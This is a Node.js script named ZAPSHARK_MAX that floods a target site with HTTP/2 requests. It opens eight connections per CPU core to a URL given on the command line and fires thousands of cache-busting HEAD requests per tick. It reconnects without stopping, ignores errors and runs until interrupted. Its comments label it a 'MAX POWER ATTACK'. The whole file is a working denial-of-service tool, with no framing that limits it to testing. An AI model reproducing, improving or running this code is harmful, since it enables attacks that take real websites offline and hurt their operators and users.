const http2 = require('http2');
const os = require('os');

class ZAPSHARK_MAX {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        this.requestsSinceLastDisplay = 0;
        
        // CPU CORES
        this.coreCount = os.cpus().length;
        this.connectionsPerCore = 8;
        this.totalConnections = this.coreCount * this.connectionsPerCore;
        
        // MEMORY LEAK PROTECTION
        this.requestChunkCounter = 0;
        this.connectionRotations = 0;
        
        // CONNECTIONS
        this.clients = new Array(this.totalConnections);
        this.connectionTimestamps = new Array(this.totalConnections);
        
        // SETUP ALL CORES
        this.initializeAllConnections();
    }

    // === INITIALIZE USING ALL CORES ===
    initializeAllConnections() {
        for (let i = 0; i < this.totalConnections; i++) {
            setTimeout(() => {
                this.createConnection(i);
            }, i % this.coreCount);
        }
    }

    createConnection(index) {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 8192,
                peerMaxConcurrentStreams: 1000
            });
            
            client.setMaxListeners(1000);
            
            client.on('error', () => {});
            client.on('close', () => {
                setTimeout(() => this.createConnection(index), 100);
            });
            
            this.clients[index] = client;
            this.connectionTimestamps[index] = Date.now();
            
        } catch (err) {
            setTimeout(() => this.createConnection(index), 100);
        }
    }

    // === MEMORY LEAK PROTECTION ===
    rotateConnections() {
        this.requestChunkCounter++;
        this.connectionRotations++;
        
        if (this.requestChunkCounter >= 50000) {
            const now = Date.now();
            for (let i = 0; i < this.totalConnections; i++) {
                if (now - this.connectionTimestamps[i] > 30000) {
                    try {
                        if (this.clients[i]) {
                            this.clients[i].destroy();
                        }
                    } catch (e) {}
                    
                    setTimeout(() => {
                        this.createConnection(i);
                    }, Math.random() * 100);
                }
            }
            this.requestChunkCounter = 0;
        }
    }

    // === MAX POWER ATTACK ===
    sendRequests() {
        this.rotateConnections();
        
        const availableConnections = this.clients.filter(c => c).length;
        const streamsThisTick = Math.min(availableConnections * 100, 5000);
        
        for (let i = 0; i < streamsThisTick; i++) {
            const index = Math.floor(Math.random() * this.totalConnections);
            const client = this.clients[index];
            
            if (!client) continue;

            try {
                const req = client.request({
                    ':method': 'HEAD',
                    ':path': '/?' + Date.now()
                });
                
                req.on('response', () => {});
                req.on('error', () => {});
                req.on('close', () => {
                    this.totalRequests++;
                    this.requestsSinceLastDisplay++;
                });
                
                req.end();
                
            } catch (err) {
                this.totalRequests++;
                this.requestsSinceLastDisplay++;
            }
        }
        
        // DISPLAY UPDATE
        if (this.requestsSinceLastDisplay >= 1000 || Math.random() < 0.01) {
            process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
            this.requestsSinceLastDisplay = 0;
        }
    }

    // === RUN FOREVER ===
    start() {
        // ATTACK ON ALL CORES
        const attackInterval = setInterval(() => {
            for (let i = 0; i < this.coreCount; i++) {
                this.sendRequests();
            }
        }, 0.1);
        
        // MEMORY CLEANUP
        const cleanupInterval = setInterval(() => {
            if (global.gc) {
                global.gc();
            }
        }, 30000);
        
        // MANUAL STOP ONLY
        process.on('SIGINT', () => {
            clearInterval(attackInterval);
            clearInterval(cleanupInterval);
            
            for (const client of this.clients) {
                try { client?.destroy(); } catch (e) {}
            }
            
            process.exit(0);
        });
    }
}

// START
const target = process.argv[2];
if (!target?.startsWith('https://')) process.exit(1);

const shark = new ZAPSHARK_MAX(target);
shark.start();
